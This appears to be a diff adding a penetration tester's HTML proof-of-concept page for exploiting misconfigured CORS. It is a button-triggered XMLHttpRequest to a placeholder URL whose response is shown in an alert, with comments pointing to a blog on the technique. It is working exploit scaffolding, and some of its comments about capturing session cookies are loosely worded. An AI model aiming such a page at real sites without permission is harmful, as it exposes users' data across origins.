@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <center>
+        <h2>CORS Proof-Of-Concept</h2>
+        <div id="ExploitButton">
+            <button type="button" onclick="cors()">Run</button>
+        </div>
+<!--
+Modified from the CORS concept available: https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/
+
+Step 1: Inspect element in browser
+Step 2: Select network to view communications
+Step 3: If successful, you should be able to see the raw headers in the request/response.  This could contain things like session cookies, etc
+Step 4: Eat cake
+
+Note:  If the exploit works, you should see the Origin & Access-Control-Allow-Origin headers in the response.
+ -->
+        <script>
+            function cors() {
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("ExploitButton").innerHTML = alert(this.responseText);
+                    }
+                };
+
+                //Use POST/GET for the first field, URL for the second field.  Leave 3rd field as true.
+                xhttp.open("POST", "INSERT-URL-HERE", true);
+                // FOR EXAMPLE:  xhttp.open("POST", "www.example/directory/test", true);
+
+                //Some applications may require specific headers.  Use the below line for each header you need (Copy/paste).
+                xhttp.setRequestHeader("HEADER-NAME-HERE", "HEADER-CONTENTS-HERE");
+                // FOR EXAMPLE:  xhttp.setRequestHeader("Content-Type", "application/json;charset=utf-8");
+
+                xhttp.withCredentials = false;
+                xhttp.send();
+            }
+        </script>
+</body>
+</html>
